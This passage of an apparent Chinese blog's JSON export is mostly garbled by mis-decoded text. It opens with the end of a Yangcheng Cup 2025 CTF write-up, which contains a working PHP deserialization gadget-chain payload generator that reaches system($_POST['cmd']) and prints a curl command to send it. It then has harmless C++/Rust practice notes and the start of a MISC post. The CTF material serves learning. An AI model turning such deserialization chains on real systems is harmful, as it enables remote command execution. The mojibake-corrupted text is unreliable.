æ—¶æ›´æ–¹ä¾¿ï¼‰ * * åˆ©ç”¨æ€è·¯ï¼ˆè¯¦å°½æ³¨é‡Šï¼‰ï¼š * 1) è§¦å‘ç‚¹ï¼šç›®æ ‡è„šæœ¬åœ¨æœ€åæ‰§è¡Œ unserialize($_POST[\u0026#39;payload\u0026#39;]); * 2) H::__destruct() åœ¨å¯¹è±¡é”€æ¯æ—¶è°ƒç”¨ $this-\u0026gt;who-\u0026gt;start(); * - å› æ­¤æˆ‘ä»¬å¸Œæœ›è®© H-\u0026gt;who æŒ‡å‘ä¸€ä¸ª A çš„å®ä¾‹ï¼ŒA::start() ä¼š echo $this-\u0026gt;next; * 3) å¦‚æœ A-\u0026gt;next æŒ‡å‘ V çš„å®ä¾‹ï¼ŒA::start() echo $this-\u0026gt;next å°†è§¦å‘ V::__toString()ï¼ˆå› ä¸º echo å¯¹è±¡ä¼šè°ƒç”¨ __toStringï¼‰ * 4) V::__toString() çš„å®ç°é‡Œï¼š * $abc = $this-\u0026gt;dowhat; * $this-\u0026gt;go-\u0026gt;$abc; * - ä¹Ÿå°±æ˜¯è¯´ï¼šå¦‚æœæˆ‘ä»¬æŠŠ dowhat è®¾ç½®ä¸º \u0026#34;secret\u0026#34;ï¼Œå¹¶æŠŠ go è®¾ç½®ä¸º E çš„å®ä¾‹ï¼Œåˆ™ä¼šè§¦å‘ E::__get(\u0026#39;secret\u0026#39;) * 5) E::__get() ä¸­ï¼Œå½“ $name===\u0026#39;secret\u0026#39; æ—¶ï¼Œä¼š echo æç¤ºå¹¶è°ƒç”¨ $this-\u0026gt;found-\u0026gt;check(); * - å› æ­¤æˆ‘ä»¬æŠŠ E-\u0026gt;found è®¾ç½®ä¸º F çš„å®ä¾‹ * 6) F::check() çš„é€»è¾‘ï¼š * if(preg_match(\u0026#34;/U/\u0026#34;, $this-\u0026gt;finalstep)) { echo \u0026#34;ä»”ç»†æƒ³æƒ³ï¼\u0026#34;; } * else { $this-\u0026gt;step = new $this-\u0026gt;finalstep(); ($this-\u0026gt;step)(); } * - å…³é”®ç‚¹ï¼špreg_match åŒ¹é…çš„æ˜¯å¤§å†™å­—æ¯ Uã€‚å¦‚æœæˆ‘ä»¬æŠŠ finalstep è®¾ä¸ºå°å†™ \u0026#39;u\u0026#39;ï¼Œpreg_match(\u0026#34;/U/\u0026#34;) ä¸åŒ¹é…ï¼Œ * äºæ˜¯ä¼šæ‰§è¡Œ $this-\u0026gt;step = new \u0026#39;u\u0026#39;(); åœ¨ PHP ä¸­ç±»åä¸åŒºåˆ†å¤§å°å†™ï¼Œnew \u0026#39;u\u0026#39;() ä¼šå®ä¾‹åŒ–ç±» Uã€‚ * - éšå ($this-\u0026gt;step)(); ä¼šè§¦å‘ U::__invoke() * 7) U::__construct() ä¼šæŠŠ $this-\u0026gt;there = new N(); å¹¶æŠŠ $this-\u0026gt;cmd = $_POST[\u0026#39;cmd\u0026#39;]; * U::__invoke() è¿”å› $this-\u0026gt;there-\u0026gt;system($this-\u0026gt;cmd); * 8) N::__call() çš„å®ç°ï¼š * return call_user_func($func_name,$args[0]); * - è¿™æ„å‘³ç€å½“é€šè¿‡ $this-\u0026gt;there-\u0026gt;system(...) è°ƒç”¨æ—¶ï¼ŒN::__call ä¼šè°ƒç”¨ call_user_func(\u0026#39;system\u0026#39;, $cmd) * - æœ€ç»ˆè¾¾åˆ°æ‰§è¡Œ system($_POST[\u0026#39;cmd\u0026#39;]) çš„æ•ˆæœ * * æ€»ç»“ï¼šæ„é€ ä¸€ä¸ª H -\u0026gt; A -\u0026gt; V -\u0026gt; E -\u0026gt; F çš„å¯¹è±¡é“¾å¹¶è®¾ç½®åˆé€‚å­—æ®µï¼Œ * åœ¨ååºåˆ—åŒ–é“¾è§¦å‘åä¼šæœ€ç»ˆæ‰§è¡Œ system($_POST[\u0026#39;cmd\u0026#39;])ã€‚ * * æ³¨æ„äº‹é¡¹ï¼š * - åœ¨æŸäº›ç»ƒä¹ /å¹³å°ä¸Šå¯èƒ½å¯ç”¨ unserialize çš„ allowed_classes ç™½åå•æˆ–ç¦ç”¨äº†æŸäº›ç±»ï¼Œè‹¥å‡ºç°è¿™ç§æƒ…å†µéœ€è¦å¦å¤–å¯»æ‰¾ gadgetã€‚ * - è¿™ä¸ªè„šæœ¬åªæ˜¯æœ¬åœ°ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼›ä¸è¦æŠŠå®ƒç›´æ¥å‘åˆ°æœªç»æˆæƒçš„æœåŠ¡å™¨ä¸Šæµ‹è¯•ã€‚ */ // ä¸ºäº†æ–¹ä¾¿ç”Ÿæˆåºåˆ—åŒ–æ•°æ®ï¼Œæˆ‘ä»¬åœ¨æœ¬åœ°å®šä¹‰ä¸ç›®æ ‡ç›¸åŒçš„ç±»åï¼ˆä»…å£°æ˜å…¬æœ‰å±æ€§ï¼Œé¿å…è°ƒç”¨ä»»ä½•æ„é€ å‡½æ•°/æ–¹æ³•ï¼‰ // è¿™äº›ç±»ä»…ç”¨äºæœ¬åœ°åºåˆ—åŒ–ï¼Œä¸ä¼šåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šè¿è¡Œæœ¬åœ°çš„æ„é€ å™¨é€»è¾‘ã€‚ class H { public $who; } class A { public $first; public $step; public $next; } class V { public $good; public $keep; public $dowhat; public $go; } class E { public $you; public $found; } class F { public $fifth; public $step; public $finalstep; } // æ„é€ å¯¹è±¡å›¾ï¼š H -\u0026gt; A -\u0026gt; V -\u0026gt; E -\u0026gt; F $h = new H(); $a = new A(); $v = new V(); $e = new E(); $f = new F(); // è®¾ç½®å…³é”®å­—æ®µï¼Œä¸ä½ åœ¨ç›®æ ‡è„šæœ¬ä¸­è¦è§¦å‘çš„æ–¹æ³•å¯¹åº” $f-\u0026gt;finalstep = \u0026#39;u\u0026#39;; // å°å†™ \u0026#39;u\u0026#39;ï¼Œé¿å¼€ preg_match(\u0026#34;/U/\u0026#34;)ï¼Œå®é™…ä¼šå®ä¾‹åŒ–ç±» U $e-\u0026gt;found = $f; // E-\u0026gt;__get() ä¸­ä¼šè°ƒç”¨ $this-\u0026gt;found-\u0026gt;check() $v-\u0026gt;dowhat = \u0026#39;secret\u0026#39;; // V::__toString() ä¼šè®¿é—® $this-\u0026gt;go-\u0026gt;secretï¼Œè§¦å‘ E::__get $v-\u0026gt;go = $e; // go æŒ‡å‘ E çš„å®ä¾‹ $a-\u0026gt;next = $v; // A::start() echo $this-\u0026gt;next -\u0026gt; è°ƒç”¨ V::__toString() $h-\u0026gt;who = $a; // H-\u0026gt;__destruct() è°ƒç”¨ $this-\u0026gt;who-\u0026gt;start() // åºåˆ—åŒ–å¹¶è¾“å‡º $payload = serialize($h); $urlencoded = rawurlencode($payload); $base64 = base64_encode($payload); echo \u0026#34;=== åŸå§‹åºåˆ—åŒ– payload ===\\n\u0026#34;; echo $payload . \u0026#34;\\n\\n\u0026#34;; echo \u0026#34;=== URL encodedï¼ˆé€‚ç”¨äº curl --data-urlencodeï¼‰ ===\\n\u0026#34;; echo $urlencoded . \u0026#34;\\n\\n\u0026#34;; echo \u0026#34;=== Base64 encodedï¼ˆå¯æ”¾ cookie/headerï¼‰ ===\\n\u0026#34;; echo $base64 . \u0026#34;\\n\\n\u0026#34;; // ä¹Ÿæ‰“å°ç¤ºä¾‹ curl å‘½ä»¤ï¼ˆè¯·æ›¿æ¢ç›®æ ‡ URLï¼‰ $example_url = \u0026#39;http://target/path/to/challenge.php\u0026#39;; $curl = sprintf(\u0026#34;curl -s -X POST --data-urlencode \\\u0026#34;payload=%s\\\u0026#34; --data-urlencode \\\u0026#34;cmd=cat /flag\\\u0026#34; \\\u0026#34;%s\\\u0026#34;\u0026#34;, $payload, $example_url); echo \u0026#34;=== ç¤ºä¾‹ curl å‘½ä»¤ï¼ˆè¯·æ›¿æ¢ URLï¼‰ ===\\n\u0026#34;; echo $curl . \u0026#34;\\n\u0026#34;; ?\u0026gt; ","date":"2025-10-12T00:00:00Z","permalink":"https://Oight.github.io/p/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-write-up/","title":"ç¾ŠåŸæ¯2025 Write UP"},{"content":"ç¼–ç¨‹å­¦ä¹ \råšå®¢é‡Œå·²ç»æœ‰Rustå­¦ä¹ äº†ï¼Œä½†é‚£ä¸ªå‡†å¤‡æ›´ä¸€äº›ä»é›¶å¼€å§‹å­¦ä¹ çš„ä¸œè¥¿\nè¿™ç¯‡åšå®¢å°±è®°å½•ä¸€ä¸‹æˆ‘åœ¨åˆ·ç‰›å®¢å’Œleetcodeæ—¶ï¼Œå‘ç°çš„ä¸€äº›å°çŸ¥è¯†å§ï¼Œå› ä¸ºä¸é™è¯­è¨€ï¼Œæ‰€ä»¥å«åšç¼–ç¨‹å­¦ä¹ \n1.ç‰›å®¢ CPP11åˆ¤æ–­å­£èŠ‚\né¢˜ç›®ï¼šCPP11åˆ¤æ–­å­£èŠ‚\nè¿™é‡Œæˆ‘é¦–å…ˆæƒ³åˆ°çš„è§£æ³•æ˜¯ä½¿ç”¨ if - else åˆ¤æ–­ç»“æ„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 #include \u0026lt;iostream\u0026gt; using namespace std; int main() { int month; cin \u0026gt;\u0026gt; month; if (month == 3 || month == 4 || month == 5) { cout \u0026lt;\u0026lt; \u0026#34;æ˜¥å­£\u0026#34;; } else if (month == 6 || month == 7 || month == 8) { cout \u0026lt;\u0026lt; \u0026#34;å¤å­£\u0026#34;; } else if (month == 9 || month == 10 || month == 11) { cout \u0026lt;\u0026lt; \u0026#34;ç§‹å­£\u0026#34;; } else if (month == 1 || month == 2 || month == 12) { cout \u0026lt;\u0026lt; \u0026#34;å†¬å­£\u0026#34;; } else { cout \u0026lt;\u0026lt; \u0026#34;ä¸åˆæ³•\u0026#34;; } return 0; } ä½†æ€»æ„Ÿè§‰è¿™æ ·å®ç°ä¸å¤ªä¼˜é›…ï¼Œçœ‹é¢˜è§£å‘ç°æœ‰äººä½¿ç”¨switch åˆ¤æ–­ç»“æ„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 #include \u0026lt;iostream\u0026gt; #include \u0026lt;ostream\u0026gt; using namespace std; int main() { int month; cin \u0026gt;\u0026gt; month; switch (month) { case 1: case 2: case 12: cout \u0026lt;\u0026lt; \u0026#34;å†¬å­£\u0026#34; \u0026lt;\u0026lt; endl; break; case 3: case 4: case 5: cout \u0026lt;\u0026lt; \u0026#34;æ˜¥å­£\u0026#34; \u0026lt;\u0026lt; endl; break; case 6: case 7: case 8: cout \u0026lt;\u0026lt; \u0026#34;å¤å­£\u0026#34; \u0026lt;\u0026lt; endl; break; case 9: case 10: case 11: cout \u0026lt;\u0026lt; \u0026#34;ç§‹å­£\u0026#34; \u0026lt;\u0026lt; endl; break; default: cout \u0026lt;\u0026lt; \u0026#34;ä¸åˆæ³•\u0026#34; \u0026lt;\u0026lt; endl; } return 0; } ä½†æ˜¯è¿™æ ·å†™å¾—è¿˜æ˜¯æœ‰ç‚¹ä¸å¤ªä¼˜é›…\næœ€åçœ‹æœ€é«˜èµé¢˜è§£æ˜¯è¿™æ ·ï¼ŒåŒæ ·æ˜¯switch åˆ¤æ–­\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 #include \u0026lt;iostream\u0026gt; using namespace std; int main() { int month; cin \u0026gt;\u0026gt; month; if(month \u0026lt; 1 || month \u0026gt; 12) //ä¼˜å…ˆåˆ¤æ–­æ˜¯å¦åˆæ³•æœˆä»½ cout \u0026lt;\u0026lt; \u0026#34;ä¸åˆæ³•\u0026#34; \u0026lt;\u0026lt; endl; else{ switch(month){ //æ ¹æ®æœˆä»½åˆ¤æ–­ case 3 ... 5: //è¿ç»­çš„å€¼ cout \u0026lt;\u0026lt; \u0026#34;æ˜¥å­£\u0026#34; \u0026lt;\u0026lt; endl; break; case 6 ... 8: cout \u0026lt;\u0026lt; \u0026#34;å¤å­£\u0026#34; \u0026lt;\u0026lt; endl; break; case 9 ... 11: cout \u0026lt;\u0026lt; \u0026#34;ç§‹å­£\u0026#34; \u0026lt;\u0026lt; endl; break; default: cout \u0026lt;\u0026lt; \u0026#34;å†¬å­£\u0026#34; \u0026lt;\u0026lt; endl; } } return 0; } è¿™æ ·å†™çš„åŸå› æ˜¯ï¼Œé¦–å…ˆä¸ºäº†é¿å…ä½¿ç”¨éº»çƒ¦çš„ if - else ,é€‰æ‹©ä½¿ç”¨switch ï¼Œ è€Œä¸”å› ä¸ºæ˜¯åˆ¤æ–­å­£èŠ‚ï¼Œæœˆä»½çš„å€¼å¤§å¤šæ˜¯è¿ç»­çš„ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨caseçš„è¿ç»­å†™æ³•ï¼šåœ¨caseä¸­ï¼Œå¯ä»¥ç”¨x\u0026hellip;yè¡¨ç¤ºèŒƒå›´åœ¨ [x,y] çš„å€¼ï¼Œä¸¤è¾¹éƒ½æ˜¯é—­åŒºé—´ã€‚\næ‰€ä»¥åœ¨ä»£ç ä¸­ case3: case4: case5: å°±å˜æˆäº† case 3...5: æœ€åå†¬å­£ä¸è¿ç»­ï¼Œå°±ä½¿ç”¨ default ä»£æ›¿ï¼Œç”±äºå·²ç»ä½¿ç”¨ if å°†æœˆä»½å€¼é™åˆ¶åœ¨ 1 - 12èŒƒå›´å†…ï¼Œé™¤å»ä»¥ä¸Šä¸‰ç§æƒ…å†µå°±å‰©å†¬å­£äº†\n2.ç‰›å®¢ CPP12 æ±‚ 1~nä¹‹é—´å¶æ•°çš„å’Œ\né¢˜ç›®ï¼š CPP12 æ±‚ 1~nä¹‹é—´å¶æ•°çš„å’Œ\nå¥½ä¹…æ²¡å†™äº†è¿whileçš„ç”¨æ³•éƒ½å¿˜äº†ï¼ŒæŒ‰ç†è¯´ä»¥å‰è¿™ä¸ªåŒæ ·åœ¨ç‰›å®¢ä¸Šç”¨rustå†™è¿‡ï¼Œåº”è¯¥æ˜¯ä¸èƒ½å¿˜çš„QAQ\nwhile å¾ªç¯å’Œ for å¾ªç¯æœ¬è´¨æ˜¯åŒä¸€ç§å¾ªç¯çš„ä¸¤ç§ä¸åŒå½¢å¼\nwhile å¾ªç¯äº‹å…ˆåªè®¾å®šå¥½äº†å¾ªç¯çš„ç»ˆç‚¹ï¼Œåœ¨æ­¤èŒƒå›´å†…ä¸æ–­æ‰§è¡Œè¯­å¥ï¼Œå…·ä½“å…¶ä»–çš„é™åˆ¶æ¡ä»¶åœ¨å¾ªç¯å†…éƒ¨å®šä¹‰\nfor å¾ªç¯åˆ™äº‹å…ˆè®¾å®šå¥½äº†å¾ªç¯çš„ç»ˆç‚¹ï¼Œä»¥åŠå¾ªç¯çš„è§„åˆ™ï¼ˆå¦‚ i++ è®¾å®šåœ¨å¾ªç¯å¤–ï¼‰\nå› æ­¤whileå¾ªç¯è¦æ¯” for å¾ªç¯ç¨å¾®çµæ´»ä¸€äº›\nåœ¨Rust ä¸­ï¼Œåœ¨ç¨‹åºç¼–è¯‘æ—¶ï¼Œç¼–è¯‘å™¨ä¼šæŠŠ while å»ç³–åŒ–å˜æˆ \u0026ldquo;ä¸€ä¸ªæ— é™å¾ªç¯ + ä¸€ä¸ªæ¡ä»¶åˆ¤æ–­å’Œ break\u0026rdquo; ï¼Œç±»ä¼¼äºè¿™æ ·ï¼š\n1 2 3 4 5 let mut i = 0; while i \u0026lt; 10 { println!(\u0026#34;{}\u0026#34;, i); i += 1; } åœ¨ MIR å±‚é¢ï¼Œå®ƒä¼šè¢«è½¬æ¢æˆç±»ä¼¼ä¸‹é¢è¿™æ ·çš„é€»è¾‘ï¼š\n1 2 3 4 5 6 7 8 9 10 let mut i = 0; loop { if i \u0026lt; 10 { // å¾ªç¯ä½“ println!(\u0026#34;{}\u0026#34;, i); i += 1; } else { break; // æ¡ä»¶ä¸æ»¡è¶³ï¼Œé€€å‡ºå¾ªç¯ } } åŒæ ·çš„ï¼Œç¼–è¯‘å™¨ä¹Ÿä¼šå¯¹ for å¾ªç¯åšç›¸ä¼¼çš„å»ç³–åŒ–å¤„ç†ï¼š\nå»ç³–åŒ–è¿‡ç¨‹ï¼šfor -\u0026gt; while let -\u0026gt; loop\nRust ä¸­çš„ for å¾ªç¯ä¹‹æ‰€ä»¥å¼ºå¤§å’Œçµæ´»ï¼Œæ˜¯å› ä¸ºå®ƒæœ¬è´¨ä¸Šæ˜¯åœ¨éå†ä¸€ä¸ªè¿­ä»£å™¨ï¼ˆIteratorï¼‰ï¼Œå› æ­¤ï¼Œä»»ä½•ä¸€ä¸ª for å¾ªç¯éƒ½ä¼šè¢«ç¼–è¯‘å™¨è½¬æ¢æˆä¸€ä¸ªä½¿ç”¨ while let å’Œè¿­ä»£å™¨çš„ç­‰ä»·ç»“æ„\nç‰›å®¢ CPP13 è®¡ç®—ä¸€ä¸ªæ•°çš„é˜¶ä¹˜ CPP13 è®¡ç®—ä¸€ä¸ªæ•°çš„é˜¶ä¹˜\næœ€é€‚åˆåŒºåˆ†é€’å½’å’Œè¿­ä»£çš„é¢˜ç›®ï¼Œä½†æˆ‘åªæƒ³åˆ°äº†è¿­ä»£çš„å®ç°ï¼Œå¿˜è®°é€’å½’æ˜¯æ€ä¹ˆå®ç°çš„äº†\nè¿­ä»£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 #include \u0026lt;iostream\u0026gt; using namespace std; int main() { int n; cin \u0026gt;\u0026gt; n; long long factorial = 1; for (int i = 2; i \u0026lt;= n; i++) { factorial *= i; } cout \u0026lt;\u0026lt; factorial \u0026lt;\u0026lt; endl; return 0; } é€’å½’ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #include \u0026lt;iostream\u0026gt; using namespace std; long long fac(int n) { if (n == 1) { return 1; } return fac(n-1) * n; } int main() { int n; cin \u0026gt;\u0026gt; n; long long factorial = fac(n); cout \u0026lt;\u0026lt; factorial \u0026lt;\u0026lt; endl; return 0; } è¿™é‡Œé‡è§äº†ä¸€ä¸ªå°å°çš„é—®é¢˜ï¼ŒC++ä¸­å‡½æ•°å£°æ˜å¿…é¡»åœ¨è°ƒç”¨å‰ï¼Œä½†Rustå°±ä¸éœ€è¦\nè¿™é‡Œå†™ä¸€ä¸‹ç›¸åŒçš„é—®é¢˜ä½¿ç”¨Rustæ˜¯å¦‚ä½•è§£å†³çš„ï¼š\nè¿­ä»£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 use std::io; fn main() { let mut stdin = String::new(); io::stdin().read_line(\u0026amp;mut stdin).expect(\u0026#34;\u0026#34;); let n = stdin .trim() .parse() .expect(\u0026#34;\u0026#34;); let mut x = 1; for i in 2..=n { x *= i; } println!(\u0026#34;{}\u0026#34;, x); } é€’å½’ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 use std::io; fn main() { let mut stdin = String::new(); io::stdin().read_line(\u0026amp;mut stdin).expect(\u0026#34;\u0026#34;); let n = stdin .trim() .parse() .expect(\u0026#34;\u0026#34;); let x = factorial(n); println!(\u0026#34;{}\u0026#34;, x); } fn factorial(n: i64) -\u0026gt; i64 { if n == 1 { return 1; } return n * factorial(n - 1); } ç‰›å®¢CPP2 å®ç°å››èˆäº”å…¥ è¿™é‡Œçœ‹åˆ°äº†ä¸¤ç§åšæ³•,ç¬¬ä¸€ç§å®ç°æ˜¯: ç”±äºC++ä¸­doubleç±»å‹æ˜¯è‡ªåŠ¨å››èˆäº”å…¥çš„,æ‰€ä»¥ç›´æ¥æ ¼å¼åŒ–è¾“å‡º0ä½å°æ•°:\n1 2 3 4 5 6 7 8 9 10 11 12 13 #include \u0026lt;iostream\u0026gt; using namespace std; int main() { double a; cin \u0026gt;\u0026gt; a; printf(\u0026#34;%.0f\u0026#34;, a); return 0; } åœ¨é¢˜è§£ä¸­çœ‹åˆ°æ›´åŠ ä¼˜é›…çš„å®ç°æ–¹æ³•:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 #include \u0026lt;iostream\u0026gt; using namespace std; int main() { double d; cin \u0026gt;\u0026gt; d; if (d \u0026gt; 0) { cout\u0026lt;\u0026lt;(int)(d+0.5); } else { cout\u0026lt;\u0026lt;(int)(d-0.5); } return 0; } è¿™ä¸ªæ˜¯æ¸¸æˆç¼–ç¨‹é‡Œå¸¸ç”¨çš„æ–¹æ³•,æ­£æ•°æµ®ç‚¹æ•°+0.5(è´Ÿæ•°æµ®ç‚¹æ•°-0.5)åå¼ºåˆ¶ç±»å‹è½¬æ¢ç›¸å½“äºå››èˆäº”å…¥\nè¿™ä¸ªåŸç†æ˜¯:ç”±äºå¼ºåˆ¶è½¬å‹çš„æ—¶å€™ç¨‹åºä¼šç›´æ¥æˆªæ–­å°æ•°(å‘é›¶å–æ•´),æ‰€ä»¥å¯¹ä»»æ„ä¸€ä¸ªæ­£æ•°åŠ 0.5,å¦‚æœå®ƒçš„å°æ•°éƒ¨åˆ†\u0026gt;0.5 åˆ™è¿›ä¸€,ç„¶åç›´æ¥æˆªæ–­,å¯¹äºè´Ÿæ•°åŒç†,å‡å»0.5,ç„¶åå‘é›¶å–æ•´.\nè¿™æ ·å°±å®ç°äº†å››èˆäº”å…¥çš„åŠŸèƒ½.\nendl å’Œ /n çš„åŒºåˆ«:\nendl: endl ä¼šè¾“å‡º \u0026lsquo;\\n\u0026rsquo; ,ç„¶åç«‹å³åˆ·æ–°ç¼“å†²åŒºå¹¶è¾“å‡ºåˆ°å±å¹•ä¸Š,ç”±äºè¦åˆ·æ–°ç¼“å†²åŒº, endl ä¼šæ¯” \\n æ…¢ä¸€ç‚¹\n5.ç‰›å®¢CPP4 è·å–ä¸¤æ•°ä¸­çš„è¾ƒå¤§å€¼\n1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;iostream\u0026gt; using namespace std; int main() { int a; int b; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;a,\u0026amp;b); printf(\u0026#34;%d\u0026#34;, a\u0026gt;b?a:b); return 0; } æ’åºå°ç« \rè¿™é‡Œå†™ä¸€ä¸‹æœ€è¿‘å­¦åˆ°çš„æœ‰å…³æ’åºçš„çŸ¥è¯†ç‚¹\næ’åºå¯èƒ½æ˜¯æ‰€æœ‰äººä¸€å¼€å§‹æ¥è§¦ç¼–ç¨‹é‡åˆ°çš„ç¬¬ä¸€ä¸ªç®—æ³•å§\né€‰æ‹©æ’åº\ré€‰æ‹©æ’åºåŸºæœ¬æ€æƒ³æ˜¯æ¯æ¬¡ä»å¾…æ’åºçš„æ•°æ®ä¸­é€‰æ‹©æœ€å°ï¼ˆæˆ–æœ€å¤§ï¼‰çš„å…ƒç´ ï¼Œæ”¾åˆ°å·²æ’åºåºåˆ—çš„æœ«å°¾ï¼Œç›´åˆ°å…¨éƒ¨æ•°æ®æ’åºå®Œæˆã€‚å³å°†æ•°ç»„ä¸­çš„æ¯ä¸€é¡¹å’Œå…¶åæ‰€æœ‰é¡¹è¿›è¡Œæ¯”è¾ƒ,é€‰å‡ºæ›´å°(æˆ–æ›´å¤§)çš„å…ƒç´ æ”¾åˆ°å·²æ’åºåºåˆ—çš„æœ«å°¾.\nç®—æ³•å®ç°:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; void selection_sort(std::vector\u0026lt;int\u0026gt; \u0026amp;nums) { int n = nums.size(); for (int i = 0; i \u0026lt; n - 1; i++) { int k = i; for (int j = i + 1; j \u0026lt; n; j++) { if (nums[j] \u0026lt; nums[k]) { k = j; } } std::swap(nums[i], nums[k]); } } int main() { int n; std::cin \u0026gt;\u0026gt; n; std::vector\u0026lt;int\u0026gt; nums(n); for (int i = 0; i \u0026lt; n; i++) { std::cin \u0026gt;\u0026gt; nums[i]; } selection_sort(nums); for (int i = 0; i \u0026lt; n; i++) { std::cout \u0026lt;\u0026lt; nums[i] \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } return 0; } å†’æ³¡æ’åº\rå†’æ³¡æ˜¯é€šè¿‡ä¸æ–­æ¯”è¾ƒç›¸é‚»ä¸¤æ•°æ¥å®ç°æ’åºçš„,åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­,æœ€å¤§çš„æ•°æ€»æ˜¯ä¼šä¸€ç›´å‘åç§»,æœ€ç»ˆå®ç°ç”±å°åˆ°å¤§çš„æ’åº(ç”±å¤§åˆ°å°åŸç†ç±»ä¼¼)\nä¸€èˆ¬å†™æ³•æ˜¯è¿™æ ·çš„:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; void bubble_sort(std::vector\u0026lt;int\u0026gt; \u0026amp;nums) { int n = nums.size(); for (int i = 0; i \u0026lt; n; i++) { for (int j = 0; j \u0026lt; n - i - 1; j++) { if (nums[j] \u0026gt; nums[j + 1]) { std::swap(nums[j], nums[j + 1]); } } } } int main() { int n; std::cin \u0026gt;\u0026gt; n; std::vector\u0026lt;int\u0026gt; nums(n); for (int i = 0; i \u0026lt; n; i++) { std::cin \u0026gt;\u0026gt; nums[i]; } bubble_sort(nums); for (int i = 0; i \u0026lt; n; i++) { std::cout \u0026lt;\u0026lt; nums[i] \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } return 0; } ä¹Ÿå¯ä»¥è¿™æ ·å†™:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; void bubble_sort(std::vector\u0026lt;int\u0026gt; \u0026amp;nums) { int n = nums.size(); for (int i = n - 1; i \u0026gt; 0; i--) { for (int j = 0; j \u0026lt; i; j++) { if (nums[j] \u0026gt; nums[j + 1]) { std::swap(nums[j], nums[j + 1]); } } } } int main() { int n; std::cin \u0026gt;\u0026gt; n; std::vector\u0026lt;int\u0026gt; nums(n); for (int i = 0; i \u0026lt; n; i++) { std::cin \u0026gt;\u0026gt; nums[i]; } bubble_sort(nums); for (int i = 0; i \u0026lt; n; i++) { std::cout \u0026lt;\u0026lt; nums[i] \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } return 0; } è¿™æ ·å°±æ›´åŠ ç›´è§‚ä¸€ç‚¹.æˆ‘ä»¬å¯ä»¥å‘ç°,å½“è¾“å…¥çš„æ•°ç»„å®Œå…¨æœ‰åºçš„æ—¶å€™,æˆ‘ä»¬å¯ä»¥ä¸éœ€è¦å†è¿‡å¾ˆå¤šéæ’åºæµç¨‹,å¯ä»¥åªè¿‡ä¸€èˆ¬,ç„¶åç›´æ¥è¾“å‡ºç»“æœ.æ‰€ä»¥å¯ä»¥å†ä¼˜åŒ–ä¸€ä¸‹:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; void bubble_sort(std::vector\u0026lt;int\u0026gt; \u0026amp;nums) { int n = nums.size(); for (int i = n - 1; i \u0026gt; 0; i--) { bool flag = false; // åœ¨è¿™é‡Œæ¯è½®é‡ç½®flag for (int j = 0; j \u0026lt; i; j++) { if (nums[j] \u0026gt; nums[j+1]) { std::swap(nums[j], nums[j+1]); flag = true; } } if (!flag) { break; } } } int main() { int n; std::cin \u0026gt;\u0026gt; n; std::vector\u0026lt;int\u0026gt; nums(n); for (int i = 0; i \u0026lt; n; i++) { std::cin \u0026gt;\u0026gt; nums[i]; } bubble_sort(nums); for (int i = 0; i \u0026lt; n; i++) { std::cout \u0026lt;\u0026lt; nums[i] \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } return 0; } è¿™é‡Œæœ‰ä¸ªæ¯è½®é‡ç½®flagçš„ç»†èŠ‚æˆ‘ä¸€å¼€å§‹æ²¡æœ‰æ³¨æ„åˆ°,å¦‚æœæŠŠflagå®šä¹‰åœ¨æ‰€æœ‰å¾ªç¯çš„å¤–é¢,é‚£ä¹ˆå¦‚æœé‡åˆ°åªéœ€è¦äº¤æ¢ä¸€æ¬¡çš„æƒ…å†µ,ç”±äºç¬¬ä¸€è½®å·²ç»å°†flagè®¾ç½®ä¸ºtrue,åç»­å³ä½¿ä¸å†äº¤æ¢,è¿˜æ˜¯ä¼šè¿‡æ’åºé€»è¾‘,ä¼˜åŒ–å°±å¤±æ•ˆäº†;ä½†å¦‚æœæ¯è½®é‡ç½®flagçš„è¯,å°±å¯ä»¥å¾ˆå¥½åœ°åº”å¯¹åªäº¤æ¢å°‘é‡æ¬¡æ•°çš„æƒ…å†µäº†,æ•ˆç‡ä¹Ÿæé«˜äº†ä¸€äº›.\n","date":"2025-10-09T00:00:00Z","permalink":"https://Oight.github.io/p/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/","title":"ç¼–ç¨‹å­¦ä¹ "},{"content":"MISCå­¦ä¹ å®å½•ï¼ˆäºŒï¼‰\rå› ä¸ºåœ¨MiGuoçš„MISCè¯¾ä¸Šç¡å¤§è§‰ï¼Œæ‰€ä»¥è¢«MiGuoæƒ©ç½šæ¥å­¦MISC Îµ(â”¬â”¬ï¹â”¬â”¬)3\nUSBæµé‡åˆ†æ\rUSBæµé‡ä¸»è¦æ˜¯é¼ æ 